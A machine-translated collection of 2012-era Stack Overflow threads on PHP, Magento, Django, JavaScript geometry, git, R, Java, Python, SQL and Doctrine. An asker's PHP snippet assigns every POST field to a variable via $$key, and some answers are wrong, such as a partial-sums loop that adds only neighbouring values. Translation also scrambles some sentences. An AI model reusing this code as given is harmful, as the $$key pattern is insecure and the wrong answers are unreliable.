之后，您的功能变得非常简单：

```
// singleton version
function _($id, $arg = null) {
   return Translate::getInstance()->text($id, $arg);
}

// registry version
function _($id, $arg = null) {
  return Registry::get('Translate')->text($id, $arg);
} 
```

然后在您的引导阶段，您将执行以下操作：

```
$lang = get_user_lang(); // replace with however you do this

//registry version
Registry::set('Tranlaste', new Translate($lang));

// or the singleton version
// youd use create instance instead of getInstance 
// so you can manage the case where you try to call 
// getInstance before a language is set
Translate::createInstance($lang); 
```

# database - Magento 提供错误页面而不是产品视图

> ID：13221864
> 
> 赞同：0
> 
> 时间：2012-11-04T19:09:36.213
> 
> 标签：database, magento, structure, apc, permalinks

我对 Magento 网上商店有疑问（已经上线 -> [http://tinyurl.com/bu8vzay](http://tinyurl.com/bu8vzay)）。当您在某个类别中选择产品时，您总是会看到 404 错误页面。

你有什么主意吗？

我尝试过的事情：

*   实时更新所有产品的属性（没问题）
*   清除缓存
*   清除索引

我已经搜索了太多小时了。欢迎所有帮助:)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-04T21:09:10.787

查看 admin 中的 Catalog -> Url Rewrtie 部分，看看是否为该产品添加了重写。

您可能还想检查 report_event_types 表以查看以下值是否存在，如果不存在则插入它们（在进行更改之前始终备份您的数据库）：

```
INSERT INTO `report_event_types` (`event_type_id`, `event_name`, `customer_login`) VALUES
(1, 'catalog_product_view', 1),
(2, 'sendfriend_product', 1),
(3, 'catalog_product_compare_add_product', 1),
(4, 'checkout_cart_add_product', 1),
(5, 'wishlist_add_product', 1),
(6, 'wishlist_share', 1); 
```

归功于[Magento 产品页面上的 404 错误](http://expertmagentodevelopers.wordpress.com/2012/07/25/404-error-on-magento-product-page/)

# django - Django Formset 覆盖为表格以显示为网格

> ID：13221871
> 
> 赞同：2
> 
> 时间：2012-11-04T19:10:47.473
> 
> 标签：django, grid, overriding, formset

我正在使用表单集在一个页面上收集多个表单的数据，但我意识到表单集的 .as_table 显示对于我正在尝试做的事情来说不是最理想的，而不是将每个表单元素打印为新的表行我正在考虑将每个表单本身打印为单独的行，并有一个带有字段名称的表头，因为我知道我的表单集对于每个表单实例都有相同的字段。通过这种方式，您可以获得一个用户可以填写的数据网格。我已经通过打印表单的模板手动完成了它，但我想知道是否有任何方法可以覆盖 formset.as_table 以在其中打印它形式而不是目前完成的方式。这可能吗，是否已经在某个地方完成了，或者如果没有，你会建议我怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T19:27:42.720

您始终可以创建自己的 Formset（也可能是 Form）子类，该子类会覆盖该[`as_table`](https://github.com/django/django/blob/1.4.2/django/forms/formsets.py#L342)方法以任何您想要的方式输出表单。

不过，我的建议是考虑使用[django-crispy-forms](http://django-crispy-forms.readthedocs.org/en/latest/tags.html#rendering-formsets)和良好的 CSS 定义。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-07-25T19:18:34.010

在您用于表单集的类（而不是使用表单集的类）中覆盖 as_table。Super() 把 as_table 变成一个变量。将其转换为字符串，然后进行 repr。将“\n”替换为空字符串。删除 repr 开头和结尾的引号。将其转换为字符串。调用 django 框架的 mark_safe 方法到结果字符串，并返回它。

# javascript - 确定一个 2D 向量是在另一个向量的右侧还是左侧

> ID：13221873
> 
> 赞同：9
> 
> 时间：2012-11-04T19:11:07.507
> 
> 标签：javascript, geometry

给定两个二维向量，如何判断第二个向量是在第一个向量的右侧（顺时针）还是在左侧（逆时针）？

例如，在这些图中，B 在 A 的右侧（逆时针）

```
A   B   .       .----> A
^  ¬    |\      |   
| /     | \     |  
|/      V  \    V 
.       B   A   B 
```

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2012-11-04T19:11:07.507

您可以使用点积来实现这一点。`dot(a, b) == a.x*b.x + a.y*b.y`可以用来判断向量是否垂直：

```
var dot = a.x*b.x + a.y*b.y
if(dot > 0)
    console.log("<90 degrees")
else if(dot < 0)
    console.log(">90 degrees")
else
    console.log("90 degrees") 
```

换一种方式。`dot > 0`告诉你是否`a`是“在前面” `b`。

* * *

假设`b`在 的右边`a`。逆时针旋转`b`90 度将其放在 前面`a`。
现在假设`b`在 的左边`a`。逆时针旋转`b`90 度会将其置于后面`a`。

因此， 的符号`dot(a, rot90CCW(b))`告诉您 b 是在 a 的右侧还是左侧，其中`rot90CCW(b) == {x: -b.y, y: b.x}`。

简单化：

```
var dot = a.x*-b.y + a.y*b.x;
if(dot > 0)
    console.log("b on the right of a")
else if(dot < 0)
    console.log("b on the left of a")
else
    console.log("b parallel/antiparallel to a") 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-06T14:19:16.487

在@Eric 的评论中的澄清中，*“如果 A 指向前方，B 在它的哪一边？”*

在这个公式中，答案非常简单。“A” 指向前方，如示例中所示，当其 x 坐标为零时。有了这个假设，“B”在其 x 坐标为正时在右侧，在负时在左侧，在零时都不在。

将此说明扩展到一般位置的“A”意味着引入一个新的坐标系，如下所示：*“在 A 指向前方的坐标系中，......”*。最简单的新坐标系是基向量为`A`和的坐标系`(1,0)`。（如果 A 是 的倍数`(1,0)`，那么它只是基本情况的 90 度旋转。）坐标变换是`L : P = (P_x, P_y) --> P' = (P'_x, P'_y) = (A_y * P_x - A_x * P_y, P_y)`。这种线性变换称为偏斜变换。测试是坐标的符号`P'_x`。检查 L 是否将 A 带到新坐标系中的向量 (0,1)。此方法使用与其他答案相同的算术。

我写了这个，以便更深层次的几何内容可能会有所启发。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-05-06T10:01:32.340

如果向量是正交的，则点积方法不起作用。对于一般情况，您希望使用矩阵 [AB] 的行列式的符号，其中 A 和 B 是您的*列*向量。一个伪代码是

c=sign(det([AB]))

这里，如果 c>0 表示 B 在左侧。这将根据矩阵中 A 和 B 的顺序进行切换。

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2015-01-13T03:10:08.763

@Eric 但是当矢量大小变化很大时，您的点积存在一个基本问题。

var dot = ax*-by + ay*bx;

如果 a(2,-2) 和 b(-500,-500) 显然 B 在 a 的左侧，但是做点积会大于 0。

# git - 使用 git 管理单个应用程序的开源和高级版本

> ID：13221875
> 
> 赞同：0
> 
> 时间：2012-11-04T19:11:12.967
> 
> 标签：git, github, project-management

> **可能重复：**
> [如何保持 git repo 的公共和私有版本同步？](https://stackoverflow.com/questions/999064/how-to-keep-public-and-private-versions-of-a-git-repo-in-sync)

我们有一个使用 GitHub 在 GitHub 上开源的应用程序`git`，但我们想要`split`并创建一个新版本的项目，`premium`即我们将添加开源版本中不可用的功能。不过，我们仍然需要能够对开源版本进行修复和更改。

问题是我们不能简单地创建一个`branch`，因为高级版本应该是 GitHub 上的私有 repo，而开源版本在 GitHub 上是公开的。

因此，如果我们只是在 GitHub 上创建一个新的私有存储库并克隆现有项目，那么现在我们有两个独立的项目，当我们进行更改/修复时，我们必须将它们应用于两者。有没有办法管理这个？

工作流程是大多数更改将仅适用于高级版本，但我们可能需要修补和修复应该适用于开源和高级版本的内容。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T19:23:41.260

您可以选择推送到的存储库和分支。

第一步是将两个单独的存储库添加到您的项目中：

```
git remote add private-repo git@github.com:user/private_repo.git
git remote add public-repo git@github.com:user/public_repo.git 
```

创建两个分支：

```
git branch private-branch
git branch public-branch 
```

设置要推送到的默认存储库：

```
git branch --set-upstream private-branch private-repo/master
git branch --set-upstream public-branch public-repo/master 
```

或者，`git push`允许您指定要推送到哪个远程分支。

```
git push private-repo private-branch:master 
```

# c# - Visual Studio中异常的位置

> ID：13221879
> 
> 赞同：0
> 
> 时间：2012-11-04T19:11:34.977
> 
> 标签：c#, visual-studio-2010

我有一个包含 winForm 项目和类库项目的项目。winform项目显然依赖于类库。

winform 依赖于类库中的一个小部件类。但是，小部件类使用其方法之一引发异常。令人沮丧的是，VS 在调用小部件方法的 winForm 应用程序中中断，而不是在 Widget 类本身中。曾经！这使得调试变得更加困难。我想知道是否有某个地方搞砸了不破坏 INTO 引用库的设置？

例子：

应用程序：

```
Widget myWidget = new Widget();
myWidget.DeleteFiles(); 
```

在小部件类中：

```
public void DeleteFiles()
{
   foreach (FileInfo currFile in ThisWidgetsFileCollection)
   {  File.Delete(currFile.FullName);}
} 
```

当小部件无法删除文件时（由于访问限制），调试器会换行

```
myWidget.DeleteFiles(); 
```

不是

```
{currFile.Delete();} 
```

希望这是有道理的？想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T19:46:26.523

在 Visual Studio 的配置管理器中，确保两个项目都设置为 DEBUG。然后右键单击您的解决方案并选择清洁解决方案。还要确保您的 Winforms 项目对库的引用是项目引用（不直接引用某些 DLL）。

然后调试您的应用程序，它应该可以正常工作。

# r - 格式化for循环的打印输出

> ID：13221881
> 
> 赞同：2
> 
> 时间：2012-11-04T19:12:01.090
> 
> 标签：r, loops, printing, for-loop, formatting

## 更新了解决我大部分问题的代码。

我有一个适度的函数来生成 MLE 的迭代以进行总体估计。（我知道迭代在 R 中的形式很差，但我试图详细展示非线性搜索过程，以配合 Excel 电子表格中的方法）。

```
n <- c(32,54,37,60,41) # number of captures 
R <- c(32,36,6,13,5) # of marked fish returned to the population

fn <- function(x){
  N = 97 #starting value of N
  mle = matrix(0, nrow=x, ncol=8) #per suggestion
  colnames(mle) = c("N","g.N","h.N","N1","g.N1","h.N1","delta.h","corr") #added column names

  for (i in 1:x) {
         g.N = prod(1-n/N)
         h.N = N-sum(R)-N*g.N
         N1 = N-1
         g.N1 = prod(1-n/N1)
         h.N1 = N1-sum(R)-N*g.N1
         delta.h = h.N-h.N1
         corr = -h.N/delta.h

  #print(c(N,g.N,h.N,N1,g.N1,h.N1,delta.h,corr))#original output

  mle[i,] = c(N,g.N,h.N,N1,g.N1,h.N1,delta.h,corr) #per suggestion
      N = N+corr
}
return(mle) #per suggestion
}

fn(5) 
```

这将创建以下输出

```
 N        g.N          h.N       N1       g.N1       h.N1   delta.h          corr
[1,] 97.00000 0.04046356 1.075034e+00 96.00000 0.03851149  0.2643856 0.8106486 -1.326141e+00
[2,] 95.67386 0.03788200 4.954192e-02 94.67386 0.03597455 -0.7679654 0.8175073 -6.060119e-02
[3,] 95.61326 0.03776543 2.382189e-03 94.61326 0.03586008 -0.8154412 0.8178234 -2.912841e-03
[4,] 95.61035 0.03775983 1.147664e-04 94.61035 0.03585458 -0.8177238 0.8178386 -1.403289e-04
[5,] 95.61020 0.03775956 5.529592e-06 94.61020 0.03585432 -0.8178338 0.8178393 -6.761220e-06 
```

我想清理输出，但无法破解代码以将结果放入矩阵或 data.frame 或任何我可以给出列标题并以有意义的方式调整数字、数字格式等的格式方式。我在 cat 和 format 方面取得了有限的成功，但无法让他们完全按照我的意愿行事。任何将其格式化为表格、矩阵或 data.frame 的帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T19:43:58.507

您的功能实际上对我不起作用（`n`例如）。无论如何，你应该有类似的东西：

```
 N<-97 #starting value of N
   m = matrix(0, nrow=5, ncol=7)
   for (i in 1:x) {
     #<snip>

     m[i,] = c(N,g.N,N1,g.N1,h.N1,delta.h,corr)
     N<-N+corr
   }
   return(m)
 } 
```

# extjs - 如果我将参数放入 ExtJS 的配置块中，为什么会丢失面板标题？

> ID：13221883
> 
> 赞同：1
> 
> 时间：2012-11-04T19:12:21.453
> 
> 标签：extjs

这是一个标题为“我的窗口”的简单面板：

```
Ext.define('MyApp.MyWindow', {
    extend : 'Ext.panel.Panel',
    title : 'My Window',
    html : '<p>This is a test</p>',
    renderTo : Ext.getBody()
}); 
```

如果我将标题放入配置块，标题将不会显示。你知道为什么吗？

```
Ext.define('MyApp.MyWindow', {
    extend : 'Ext.panel.Panel',
    config : {
        title : 'My Window',
        html : '<p>This is a test</p>'
    },
    renderTo : Ext.getBody()
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T22:43:52.997

因为 panel 组件已经定义了 title 和 html 的属性。你不应该对任何扩展 Ext 组件的类使用 config 选项。这对于创建自己的类很有用。如果您注意到“类系统”指南中提供的示例使用此配置，但没有扩展和 Ext 组件。我的猜测是，由于 Ext Components 使用这个系统的秘密，它是在保护自己。

# java - 写入 java 子进程

> ID：13221887
> 
> 赞同：1
> 
> 时间：2012-11-04T19:12:39.533
> 
> 标签：java, subprocess, java.util.scanner, printwriter, printstream

我正在尝试写入子进程的标准输入（两者都是 Java 应用程序）。`PrintStream`读取进程的输出工作正常，但使用或输入不起作用`PrintWriter`。这是我编写的用于测试奇怪行为的示例程序，我在没有参数的情况下运行该程序。然后运行与子进程相同的程序。子进程只是读取输入并将其回显到输出中。主进程获取标准输入并将其写入子进程输入，并将子进程输出输出到标准输出。

麻烦的是，这行不通。子流程的与父流程中的语句`nextLine()`不匹配，因此子流程永远不会输出任何内容。`println()`

为什么会发生这种情况，我该如何解决（最好在父进程上，因为我无法更改主项目的子进程）。

```
import java.lang.*;
import java.io.*;
import java.util.Scanner;

public class ProcTest{
    public static Scanner stdin;
    public static String line;
    public static Process sub;

    public static BufferedReader childout;
    public static PrintWriter childin;

    public static void main(String[] args){
            stdin = new Scanner(System.in);
            if(args.length > 0 && args[0].equals("y")){
                    while(true){
                            line = stdin.nextLine();
                            System.out.println(line);
                    }
            }else{
                    try{
                            sub = Runtime.getRuntime().exec("java ProcTest y");
                            childout = new BufferedReader(new InputStreamReader(sub.getInputStream()));
                            childin = new PrintWriter(sub.getOutputStream());
                            while(true){
                                    childin.println(stdin.nextLine());
                                    childin.flush();
                                    while(childout.ready()) System.out.println( childout.readLine() );
                            }
                    }catch(IOException e){
                            e.printStackTrace();
                    }
            }
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T20:56:12.030

这种事情的通常原因是缓冲问题。

在您的示例程序中，我看到了一个可能的问题：在子进程中，您正在执行`System.out.println()`但之后没有刷新。查阅Javadoc表示`PrintStream`s可能会自动刷新，但没有说明默认`System.out`是否如此配置，值得一试。

请注意，某些平台仅在它是终端时才决定自动刷新标准输出（我不知道 Java 是否`System`这样做），这可能会在调试时混淆问题。

（我确实注意到您说在实际情况下您不能更改子进程，但如果这是问题所在，那么您*必须*更改子进程（或者，如果有 is-a-terminal测试，将其包装在伪终端中）。）

# javascript - 我无法完全清除转换后的矩形

> ID：13221888
> 
> 赞同：1
> 
> 时间：2012-11-04T19:12:48.117
> 
> 标签：javascript, html, canvas, html5-canvas

此代码无法完全清除画布元素中转换后的矩形。我怎样才能完全清除？

```
var canvas = document.getElementById("canvas");
var context = canvas.getContext("2d");

context.transform(1, 0.5, 0, 1, canvas.width / 2 , canvas.height);
context.fillStyle = 'red';
context.fillRect(20, 20, 200, 100);
context.clearRect(20, 20, 200, 100); 
```

我可以通过以下代码清除转换后的矩形

```
var canvas = document.getElementById("canvas");
var context = canvas.getContext("2d");

var x = 20;
var y = 20;
var width = 200;
var height = 100;

context.transform(1, 0.5, 0, 1, canvas.width / 2 , canvas.height / 2);
context.fillStyle = 'red';
context.fillRect(x, y, width, height);
context.clearRect(x, y - 1, width, height + 2); 
```

我将清晰的矩形向上移动到顶部 1px 并增加 2px 宽以清除剩余的边框。

这段代码运行良好。但这是短期解决方案！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T19:34:22.747

我也遇到过这种情况。这是由应用于初始形状的抗锯齿引起的。它适用于不使用抗锯齿的形状，例如不变换画布时的矩形。我发现的唯一解决方案是`clearRectangle`使用稍高的形状（每边约 1-2 个像素）调用。

# php - 无法使用 PHP Mail 发送电子邮件

> ID：13221894
> 
> 赞同：0
> 
> 时间：2012-11-04T19:13:47.973
> 
> 标签：php

我正在尝试使用 php 发送电子邮件。我只有以下内容，它似乎没有向我的浏览器输出任何内容，也没有发送我的电子邮件，任何人都可以看到我做错了什么吗？

```
 $to = "liam@mysite.co.uk";
$subject = "Alien Sighting";
$message = foreach ($_POST as $key=>$value) {
    $$key = $value;
}
$from = "Sighting@site.co.uk";
$headers = "From:" . $from;
mail($to,$subject,$message,$headers);
echo "Mail Sent."; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T19:30:48.913

在这种情况下，PHP 不向浏览器输出任何内容（即使它应该输出），脚本很可能在您的`echo`语句之前失败。

确保您没有禁用错误报告。请参阅 PHP[运行时配置](http://php.net/manual/en/errorfunc.configuration.php) `error_reporting`和`display_errors`. 您还可以在代码中使用[error_reporting()](http://php.net/manual/es/function.error-reporting.php)函数更改错误报告行为。启用错误报告可帮助您找出问题可能是什么。

即使您已禁用浏览器上的错误报告，请查看您的网络服务器日志。他们应该详细说明问题出在哪里（脚本中的语法错误，邮件函数调用发送邮件失败......有很多可能性）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T19:20:08.127

Can you give us $_POST content please ?

Does your PHP configuration display all errors messages? Make sure to use error_reporting (E_ALL) in your dev environnement to find any typo / error. That should help to get an output to your browser.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T19:24:09.997

如果您在计算机上运行脚本，则必须确保设置 SMTP 服务器以发送电子邮件，否则您可以获得测试服务器，因此您不必设置它会自动发送的 SMTP

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-04T19:25:17.200

你在使用 Rmail.php 吗？您是将代码上传到网络服务器还是在本地 PC 上？

我总是使用 Rmail.php 来发送邮件。

```
$mail = new Rmail();
$mail->setFrom(YOUR ADDRESS);
$mail->setSubject(YOUR SUBJECT);
$mail->setHTML($textSchueler);
$mail->send(array($address)); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-04T19:26:45.690

您还需要检查并确保您的服务器已配置为发送电子邮件。如果您正在设置自己的服务器或在本地开发，大多数共享主机帐户将为您配置，但 PHP 可能无法发送消息。尝试检查 mail() 函数是否返回 true 表示消息已成功发送，然后查看服务器上的邮件日志以验证传输。

# html - 如何为所有显示尺寸设计网站

> ID：13221895
> 
> 赞同：0
> 
> 时间：2012-11-04T19:13:50.123
> 
> 标签：html, css, user-interface, slice

我喜欢在我的页面上使用很多独特的图形，这通常会导致根据可用的屏幕宽度/高度制作不同的页面大小。

这里有两个例子：

[http://www.uvm.edu/~areid/homesite/](http://www.uvm.edu/~areid/homesite/) - 图像漂浮在我的屏幕底部，但在更大的浏览器上，图像漂浮在中间附近，使它看起来不好看。窗口底部与图像底部对齐时效果最佳

www.stevenlebel.com - 它根据检测到的显示器尺寸加载两个不同的页面。

这似乎是很多冗余编码。我的问题是，如何使切片/Photoshop 图像很好地过渡到不同的屏幕尺寸。Photoshop 是否允许您制作 DIVS 而不是表格？当浏览器窗口大小发生变化时，我可以让 Photoshop 创建的每个切片都增大/缩小吗？

如果有人对创建这样的网站有任何意见，我很想听听他们要说什么。

谢谢

凯蒂

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T19:22:22.137

使用[媒体查询](http://cssmediaqueries.com/)与正确选择的[断点](http://www.vanseodesign.com/web-design/media-query-breakpoints/)、精灵或单个图像的组合，甚至像[foresight.js](https://github.com/adamdbradley/foresight.js?utm_source=html5weekly)这样的库，您可以实现您正在寻找的结果。

媒体查询将允许您为不同的屏幕组设置站点，并设置断点以覆盖大多数平板电脑、手机等。然后您可以从精灵或完全单独的图像加载不同的图像版本。最后，foresight.js 将查看屏幕分辨率和可用带宽，以便在需要时为视网膜浏览器加载更高分辨率的图像。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-05T06:22:57.150

将页面大小设置为

```
.page
        { 
        width:100%
        margin-left:auto;
        margin-right:auto;

        } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-10T10:06:46.543

浏览[mediaqueri.es](http://mediaqueri.es/)并了解其他人如何解决您的问题，同时不要忘记[dribbble](http://dribbble.com/)。我想你知道个人电脑的网页设计，其他的是智能手机、平板电脑和电视。对移动操作系统上应用程序的用户界面有一些基本的了解。阅读[Android 设计](http://developer.android.com/design/index.html)、[iOS 应用程序设计策略](http://developer.apple.com/library/ios/#documentation/userexperience/conceptual/mobilehig/AppDesign/AppDesign.html)和[Windows 8 应用程序设计 UX](http://msdn.microsoft.com/en-us/library/windows/apps/hh779072.aspx)。在那之后，我认为您将有一个适当的设计来解决您的问题。然后学习[css3 媒体查询，从](http://mobile.smashingmagazine.com/2010/07/19/how-to-use-css3-media-queries-to-create-a-mobile-version-of-your-website/)[html5boilerplate](http://html5boilerplate.com)开始编码，从移动设计开始。祝你好运！

# python - Python：数字的部分总和

> ID：13221896
> 
> 赞同：9
> 
> 时间：2012-11-04T19:13:51.353
> 
> 标签：python

你能帮我处理在文本文件中返回部分数字总和的代码吗？我必须导入文本文件，然后在没有工具的情况下为部分总和编写代码..etc。

我的输入：

```
4
13
23
21
11 
```

输出应该是（不带括号或逗号）：

```
4 
17
40
61 
72 
```

我试图用python编写代码，但只能做总和而不是部分。如果我将`+=`运算符用于生成器，它会给我一个错误！

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-11-04T19:23:46.957

好吧，既然每个人似乎都在用他们最喜欢的习语来解决问题，那么Python 3 中的[itertools.accumulate怎么样：](http://docs.python.org/3.2/library/itertools.html#itertools.accumulate)

```
>>> import itertools
>>> nums = [4, 13, 23, 21, 11]
>>> list(itertools.accumulate(nums))
[4, 17, 40, 61, 72] 
```

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-11-04T19:20:18.967

There are a number of ways to create your sequence of partial sums. I think the most elegant is to use a [generator](http://wiki.python.org/moin/Generators).

```
def partial_sums(iterable):
    total = 0
    for i in iterable:
        total += i
        yield total 
```

You can run it like this:

```
nums = [4, 13, 23, 21, 11]
sums = list(partial_sums(nums)) # [ 4, 17, 40, 61, 72] 
```

**Edit** To read the data values from your file, you can use another generator, and chain them together. Here's how I'd do it:

```
with open("filename.in") as f_in:
    # Sums generator that "feeds" from a generator expression that reads the file
    sums = partial_sums(int(line) for line in f_in)

    # Do output:
    for value in sums:
        print(value)

    # If you need to write to a file, comment the loop above and uncomment this:
    # with open("filename.out", "w") as f_out:
    #    f_out.writelines("%d\n" % value for value in sums) 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-11-04T19:17:15.317

[`numpy.cumsum`](http://docs.scipy.org/doc/numpy/reference/generated/numpy.cumsum.html#numpy.cumsum) will do what you want.

If you're not using `numpy`, you can write your own.

```
def cumsum(i):
    s = 0
    for elt in i:
        s += elt
        yield s 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2014-07-31T20:53:43.757

在 numpy 中使用累积和：

```
import numpy as np
input = np.array([4, 13, 23, 21 ,11])
output = input.cumsum() 
```

结果：

```
print output
>>>array([ 4, 17, 40, 61, 72]) 
```

或者，如果您需要一个列表，您可以将输出转换为列表：

```
output = list(output)
print output
>>>[4, 17, 40, 61, 72] 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-11-04T19:23:42.167

尝试这个：

```
import numpy as np

input = [ 4, 13, 23, 21, 11 ]
output = []
output.append(input[0])
for i in np.arange(1,len(input)):
    output.append(input[i] + input[i-1])

print output 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2014-07-31T20:40:26.100

这是使用[reduce](https://docs.python.org/2/library/functions.html#reduce)的替代解决方案：

```
nums = [4, 13, 23, 21, 11]
partial_sum = lambda a, b: a + [a[-1] + b]
sums = reduce(partial_sum, nums[1:], nums[0:1]) 
```

lambda 中的加号不是同一个运算符，第一个是列表连接，第二个是两个整数的和。虽然 Blckknght 可能更清楚，但这个更短并且适用于 Python 2.7。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-11-04T19:16:55.143

something like this:

```
>>> lst = [4, 13, 23, 21 ,11]
>>> [sum(lst[:i+1]) for i, x in enumerate(lst)]
[4, 17, 40, 61, 72] 
```

# sql - 返回字符计数所在的行？

> ID：13221902
> 
> 赞同：1
> 
> 时间：2012-11-04T19:14:12.447
> 
> 标签：sql, ruby, activerecord, stored-procedures

我正在使用 sql 和 ruby​​ 开发一个基本的单词查找器应用程序，其中我有一组字母来查找可用的单词。通过缩小数组中不包含的字母来更容易进行查询。例如。

```
alphabet= %w{a b c d e f g h i j k l m n o p q r s t u v w x y z}

available_letters = %w{p k z l p m t l n g g r u a r t n d z w a l m n e} 
```

然后，我可以从字母表中减去要从我的搜索中排除的字母，并最终得到一个如下所示的 sql 查询。

```
select * from words
where word not like '%b%' and word not like '%c%' and word not like '%f%'..... 
```

这为我提供了所有可用单词以及所有可用字母的组合。它不会按字母出现的次数来缩小范围。因此，如果我只有一个“E”，我希望查询缩小只包含一个 e 的单词。我不确定这是否可以通过 sql 查询来完成，或者我是否需要使用过程。有谁知道解决这个问题的好方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-06T16:09:30.767

您可能想要寻找更快的方法来实现这一点，但要回答您的问题，您可以排除带有多个“e”的单词`not like '%e%e%'`。

# python - psycopg2，插入没有时区的时间戳

> ID：13221906
> 
> 赞同：0
> 
> 时间：2012-11-04T19:14:25.567
> 
> 标签：python, postgresql

我在使用 psycopg2 将数据插入到 postgresql 表中时遇到问题。

该脚本执行以下操作：

1.  从 postgres 数据库中查询数据
2.  使用 numpy 做一些数学运算
3.  然后我想将日期重新插入数据库中的另一个表。下面是插入数据的代码：

    ```
    cur.executemany("INSERT INTO water_level_elev (hole_name,measure_date,water_level_elev,rid) VALUES (%s,%s,%s,%s);",[(hole.tolist(),m_date.tolist(),wl.tolist(),rid.tolist(),)]) 
    ```

该脚本引发以下错误：

```
psycopg2.ProgrammingError: column "measure_date" is of type timestamp without time zone but expression is of type timestamp without time zone[]

LINE 1: INSERT INTO water_level_elev (hole_name,measure_date,water_l...
                                            ^
HINT:  You will need to rewrite or cast the expression. 
```

我很困惑...“measure_date”列和我要插入的数据属于同一类型。什么问题？？？？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T19:41:59.447

`tolist()`在没有on的情况下试一试`m_date`。

如果不查看表的表架构`water_level_elev`或方法的来源，就不可能完全回答这个问题`tolist`。但是，听起来 PostgreSQL 期望的`measure_date`值是时间戳，但正在获取时间戳*列表*。这就是为什么 PostgreSQL`[]`在错误消息的第二个类型的末尾。这似乎是因为您粘贴的代码调用了一个以变量`tolist`中的任何内容命名的方法`m_date`，该方法很可能将单个时间戳转换为时间戳列表，其中包含`m_date`.

# symfony - 在 Symfony 2 上创建关系实体

> ID：13221908
> 
> 赞同：1
> 
> 时间：2012-11-04T19:14:46.383
> 
> 标签：symfony

我想在我的网站上保存我的用户搜索。这就是为什么我有一个类用户并且我想创建搜索类。我已经做到了：

```
class Search 
{

    public function __construct()
    {
        $this->searched_date = new \Datetime(); 
    }

    /**
    * @ORM\Id
    * @ORM\Column(type="integer")
    * @ORM\GeneratedValue
    */
    private $id;

    /**
    * @ORM\Id
    * @ORM\ManyToOne(targetEntity="test\UserBundle\Entity\User")
    */
    private $user;

    /**
    * @ORM\Column(name="termsearch", type="string", length=255, nullable="true")
    */
    private $termsearch;

    /**
     * @ORM\Column(name="goodtitle", type="string", length=255, nullable="true")
     */
    private $goodtitle;

    /**
    * @ORM\Column(name="searched_date", type="datetime")
    */
    private $searched_date;

    /**
     * Set termsearch
     *
     * @param text $termsearch
     */
    public function setTermsearch($termsearch)
    {
        $this->termsearch = $termsearch;
    }

    /**
     * Get termsearch
     *
     * @return text 
     */
    public function getTermsearch()
    {
        return $this->termsearch;
    }

    /**
     * Set searched_date
     *
     * @param datetime $searchedDate
     */
    public function setSearchedDate($searchedDate)
    {
        $this->searched_date = $searchedDate;
    }

    /**
     * Get searched_date
     *
     * @return datetime 
     */
    public function getSearchedDate()
    {
        return $this->searched_date;
    }

    /**
     * Set user
     *
     * @param test\UserBundle\Entity\User $user
     */
    public function setUser(\test\UserBundle\Entity\User $user)
    {
        $this->user = $user;
    }

    /**
     * Get user
     *
     * @return test\UserBundle\Entity\User 
     */
    public function getUser()
    {
        return $this->user;
    }

    /**
     * Set goodtitle
     *
     * @param text $goodtitle
     */
    public function setGoodtitle($goodtitle)
    {
        $this->goodtitle = $goodtitle;
    }

    /**
     * Get goodtitle
     *
     * @return text 
     */
    public function getGoodtitle()
    {
        return $this->goodtitle;
    }

    /**
     * Get id
     *
     * @return integer 
     */
    public function getId()
    {
        return $this->id;
    }
} 
```

我想这样插入：

```
$em = $this->getDoctrine()->getEntityManager();
$user = $em->getRepository('TestUserBundle:User')->find($currentuser->getID());     
$search = new Search();
$search->setUser($user);
$search->setTermsearch($termsearch);
$search->setGoodtitle($goodtitle);
$em->persist($search);
$em->flush(); 
```

不幸的是我有这个错误：

```
SQLSTATE[HY093]: Invalid parameter number: number of bound variables does not match number of tokens (500 Internal Server Error) 
```

在堆栈中，我们可以发现：

```
INSERT INTO s_search (user_id, termsearch, goodtitle, searched_date) VALUES (?, ?, ?, ?) ({"1":"c2c","2":"C2C Down The Road","3":{"date":"2012-10-31 00:18:47","timezone_type":3,"timezone":"Europe\/Paris"}}) 
```

我不知道如何创建此类搜索...感谢您的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T19:42:47.847

`@ORM\Id`从@ManyToOne 映射引用中删除`$user`不需要类型。有关详细信息，请参阅[Doctrine 的注释参考](http://docs.doctrine-project.org/en/2.0.x/reference/annotations-reference.html#manytoone)。Doctrine 负责正确的列类型以保存对另一个实体的引用。

还要确保您的 User 查询确实返回了有效的`$user`. 如果 Search 可能没有`$user`，请使用`@JoinColumn`注释来声明该列可为空。查看另一个 SO 问题[Doctrine 2 can't use nullable=false in manyToOne 关系？](https://stackoverflow.com/questions/9674397/doctrine-2-cant-use-nullable-false-in-manytoone-relation)

# opencv - 如何使用 Homography？

> ID：13221909
> 
> 赞同：-1
> 
